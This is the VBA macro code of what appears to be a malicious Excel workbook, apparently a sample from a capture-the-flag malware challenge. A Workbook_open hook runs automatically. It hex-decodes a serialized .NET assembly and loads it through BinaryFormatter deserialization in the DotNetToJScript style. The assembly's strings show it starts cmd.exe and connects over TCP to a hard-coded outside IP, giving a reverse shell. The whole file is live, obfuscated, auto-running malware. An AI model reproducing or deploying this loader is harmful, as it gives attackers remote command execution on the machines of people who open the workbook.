Sub Workbook_open()
'
' Workbook_open Macro
'
'
Run

End Sub


Sub DebugPrint(s)
End Sub

Private Function decodeHex(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject("Microsoft.XMLDOM")
    Set EL = DM.createElement("tmp")
    EL.DataType = "bin.hex"
    EL.Text = hex
    decodeHex = EL.NodeTypedValue
End Function

Function Run()
    On Error Resume Next

    Dim s As String
    s = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E7472792253797374656D2E44656C65"
    s = s & "6761746553657269616C697A6174696F6E486F6C6465722F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C64657209020000000903000000090400000004020000003053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727907000000047479706508"
    s = s & "617373656D626C79067461726765741274617267657454797065417373656D626C790E746172676574547970654E616D650A6D6574686F644E616D650D64656C6567617465456E747279010102010101033053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727906050000002F53797374656D2E52756E74696D65"
    s = s & "2E52656D6F74696E672E4D6573736167696E672E48656164657248616E646C657206060000004B6D73636F726C69622C2056657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530383906070000000774617267657430090600000006090000000F53797374656D2E44656C6567"
    s = s & "617465060A0000000D44796E616D6963496E766F6B650A04030000002253797374656D2E44656C656761746553657269616C697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300307033053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E747279022F53797374"
    s = s & "656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C646572090B000000090C000000090D00000004040000002F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C64657206000000044E616D650C417373656D626C794E616D6509436C6173734E616D65095369676E6174"
    s = s & "7572650A4D656D626572547970651047656E65726963417267756D656E7473010101010003080D53797374656D2E547970655B5D090A0000000906000000090900000006110000002C53797374656D2E4F626A6563742044796E616D6963496E766F6B652853797374656D2E4F626A6563745B5D29080000000A010B0000000200000006120000002053797374656D2E586D6C2E5363"
    s = s & "68656D612E586D6C56616C756547657474657206130000004D53797374656D2E586D6C2C2056657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530383906140000000774617267657430090600000006160000001A53797374656D2E5265666C656374696F6E2E417373656D62"
    s = s & "6C790617000000044C6F61640A0F0C00000000180000024D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000"
    s = s & "00504500004C0103002E0FCE640000000000000000E00022200B013000000E00000008000000000000DA2D0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000882D00004F000000004000000C0400000000000000"
    s = s & "0000000000000000000000006000000C000000502C00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000E00D000000200000000E000000020000000000000000000000000000200000602E727372630000000C0400"
    s = s & "00004000000006000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001600000000000000000000000000004000004200000000000000000000000000000000BC2D000000000000480000000200050040220000100A00000100000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "00000000000000000000000000000013300200320000000100001102280E00000A000072010000700A280F00000A0B06076F1000000A16FE010C082C090016281100000A00002803000006002A260003281200000A262A1B300300090100000200001100723B0000702039050000731300000A0A00066F1400000A0B0007731500000A0C0007731600000A8001000004731700000A0D"
    s = s & "731800000A130411046F1900000A72550000706F1A00000A0011046F1900000A176F1B00000A0011046F1900000A166F1C00000A0011046F1900000A176F1D00000A0011046F1900000A176F1E00000A0011046F1900000A176F1F00000A00110414FE0604000006732000000A6F2100000A0011046F2200000A2611046F2300000A002B2B0009086F2400000A6F2500000A2611046F"
    s = s & "2600000A096F2700000A000916096F2800000A6F2900000A26001713052BD0082C07086F2A00000A00DC072C07076F2A00000A00DC062C07066F2A00000A00DC0000000128000002002100C7E8000B0000000002001900DAF3000B0000000002001100EDFE000B000000001B300200490000000300001100731700000A0A036F2B00000A282C00000A16FE010B072C2F000006036F2B"
    s = s & "00000A6F2500000A267E01000004066F2700000A007E010000046F2D00000A0000DE050C0000DE00002A0000000110000000001A00284200051700000142534A4201000100000000000C00000076322E302E35303732370000000005006C0000001C030000237E0000880300008C04000023537472696E6773000000001408000068000000235553007C080000100000002347554944"
    s = s & "0000008C0800008401000023426C6F620000000000000002000001571502000900000000FA013300160000010000001F000000020000000100000004000000030000002D0000000E00000003000000010000000200000000001F0201000000000006005C015C030600C9015C030600A9002A030F007C0300000600D100520206003F0152020600200152020600B001520206007C0152"
    s = s & "020600950152020600E80052020600BD003D0306009B003D030600030152020600DF034B020600E5020A000A00EB03CC03060044020A00060091020A000600A9024E040A00C4032A030A008B032A03060064024B020600F5034B02060002024B020A003302CC030A0080022A030A00CC022A0306009E020A000600FF020A00060044004B020000000001000000000001000100010010"
    s = s & "00A80300003D00010001001100F2029D0050200000000086182403060001008E20000000008600C1031000010098200000000096006E02A1000200D821000000009600B702A5000200000001000F0200000100B203000002008B00090024030100110024030600190024030A002900240310003100240310003900240310004100240310004900240310005100240310005900240310"
    s = s & "00610024031500690024031000710024031000790024030600C1005D002000C900A1032400C100E6032900A90001042E00890024034200890041024800990024034D00810024034D00A10024030600A90024030600A90072025300D90050001000D9005A041500D900E7011500D90033041500D90019041500D9000A031500E10024035800A90026005E00A90001046400A9006D0006"
    s = s & "00E90078006800A1003D006C00A90007047200F10081007700A10014027C00A100FB018000F90093000600B10014006800C9007D048F00F100090206002E000B00AC002E001300B5002E001B00D4002E002300DD002E002B00F2002E0033001C012E003B001C012E004300DD002E004B0022012E0053001C012E005B001C012E00630047012E006B00710143005B007E011A00340087"
    s = s & "000480000001000000000000000000000000006D04000002000000000000000000000094001D000000000002000000000000000000000094004B02000000000000003C4D6F64756C653E0053797374656D2E494F006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400417070656E640049446973706F7361626C65007365745F46"
    s = s & "696C654E616D65006765745F4D616368696E654E616D6500426567696E4F7574707574526561644C696E650057726974654C696E65006F75744C696E6500446973706F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373"
    s = s & "656D626C7954726164656D61726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D"
    s = s & "626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650052656D6F766500537472696E6700466C757368007061746800676574"
    s = s & "5F4C656E677468004578616D706C65417373656D626C792E646C6C004E6574776F726B53747265616D0047657453747265616D0053797374656D0053797374656D2E5265666C656374696F6E00457863657074696F6E0052756E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D52656164657200546578745265616465720053747269"
    s = s & "6E674275696C64657200436D644F75747075744461746148616E646C6572004461746152656365697665644576656E7448616E646C65720053747265616D5772697465720073747265616D5772697465720054657874577269746572007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D"
    s = s & "2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F646573004461746152656365697665644576656E744172677300457175616C730054657374436C6173730073656E64696E6750726F636573730052756E50726F636573730053797374656D2E4E65742E536F"
    s = s & "636B657473004F626A656374004578697400546370436C69656E7400456E7669726F6E6D656E74005374617274006765745F5374616E64617264496E707574007365745F52656469726563745374616E64617264496E707574007365745F52656469726563745374616E646172644F75747075740053797374656D2E54657874007365745F4372656174654E6F57696E646F77004578"
    s = s & "616D706C65417373656D626C790049734E756C6C4F72456D707479000000394800540042007B0034006E00300074006800330072005F006200300074006E00330074005F0034006E0034006C0079007A00330064007D000019370037002E00370034002E003100390038002E0035003200000F63006D0064002E0065007800650000000000AC7BEB0166D9424C80442DFAE473A62F00"
    s = s & "042001010803200001052001011111042001010E04200101020507030E0E020300000E042001020E040001010805000112550E0D070612451249124D1251125502052002010E080420001269052001011249042000126D052002011C18052001011271032000020320000E05200112510E0420001241042001011C0320000806200212510808070703125102125D040001020E08B77A"
    s = s & "5C561934E0890306124103000001060002011C12590801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000701000000001401000F4578616D706C65417373656D626C790000290100244578616D706C6520417373656D626C7920666F7220446F744E6574546F4A53637269707400000501000000002401001F436F7079726967"
    s = s & "687420C2A9204A616D657320466F7273686177203230313700002901002435363539386631632D366438382D343939342D613339322D61663333376162653537373700000C010007312E302E302E300000050100010000000000002E0FCE6400000000020000001C0100006C2C00006C0E0000525344535EC19411BD59514CB34A23A0C76AF20D01000000433A5C55736572735C6465"
    s = s & "76656C6F7065725C736F757263655C7265706F735C446F744E6574546F4A5363726970745C4578616D706C65417373656D626C795C6F626A5C44656275675C4578616D706C65417373656D626C792E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B02D00000000000000000000CA2D0000002000000000000000000000000000000000000000000000BC2D000000000000000000"
    s = s & "0000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF2500200010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000B003000000"
    s = s & "00000000000000B00334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C0061"
    s = s & "00740069006F006E00000000000000B00410030000010053007400720069006E006700460069006C00650049006E0066006F000000EC020000010030003000300030003000340062003000000062002500010043006F006D006D0065006E007400730000004500780061006D0070006C006500200041007300730065006D0062006C007900200066006F007200200044006F0074004E"
    s = s & "006500740054006F004A005300630072006900700074000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000480010000100460069006C0065004400650073006300720069007000740069006F006E00000000004500780061006D0070006C00650041007300730065006D0062006C0079000000300008000100460069006C00650056"
    s = s & "0065007200730069006F006E000000000031002E0030002E0030002E003000000048001400010049006E007400650072006E0061006C004E0061006D00650000004500780061006D0070006C00650041007300730065006D0062006C0079002E0064006C006C00000062001F0001004C006500670061006C0043006F007000790072006900670068007400000043006F007000790072"
    s = s & "0069006700680074002000A90020004A0061006D0065007300200046006F007200730068006100770020003200300031003700000000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000005000140001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004500780061006D0070006C"
    s = s & "00650041007300730065006D0062006C0079002E0064006C006C000000400010000100500072006F0064007500630074004E0061006D006500000000004500780061006D0070006C00650041007300730065006D0062006C0079000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E00300000003800080001"
    s = s & "0041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000DC3D0000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "0000000000000000000000000000000000010D00000004000000091700000009060000000916000000061A0000002753797374656D2E5265666C656374696F6E2E417373656D626C79204C6F616428427974655B5D29080000000A0B"

    entry_class = "TestClass"

    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject("System.IO.MemoryStream")

    If stm Is Nothing Then
        manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?><assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""><assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" /><clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Ser"
        manifest = manifest & "ialization.Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907746-455E-39A7-BD31-BC9F81468347}"" progid=""System.Collections.ArrayList"" threadingModel=""Both"" name=""System.Co"
        manifest = manifest & "llections.ArrayList"" runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468347}"" progid=""System.Text.ASCIIEncoding"" threadingModel=""Both"" name=""System.Text.ASCIIEncoding"" runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81488347}"" progid=""System."
        manifest = manifest & "Security.Cryptography.FromBase64Transform"" threadingModel=""Both"" name=""System.Security.Cryptography.FromBase64Transform"" runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeV"
        manifest = manifest & "ersion=""v4.0.30319"" /></assembly>"

        Set ax = CreateObject("Microsoft.Windows.ActCtx")
        ax.ManifestText = manifest
        
        Set stm = ax.CreateObject("System.IO.MemoryStream")
        Set fmt = ax.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
        Set al = ax.CreateObject("System.Collections.ArrayList")
    Else
        Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
        Set al = CreateObject("System.Collections.ArrayList")
    End If

    Dim dec
    dec = decodeHex(s)

    fullyDecoded = " "

    For Each i In dec
        stm.WriteByte i
        fullyDecoded = fullyDecoded & i & " "
    Next i

    WScript.Echo(fullyDecoded)

    stm.Position = 0

    Dim n As Object, d As Object, o As Object
    Set d = fmt.Deserialize_2(stm)
    al.Add Empty

    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    
    If Err.Number <> 0 Then
      DebugPrint Err.Description
      Err.Clear
    End If
End Function
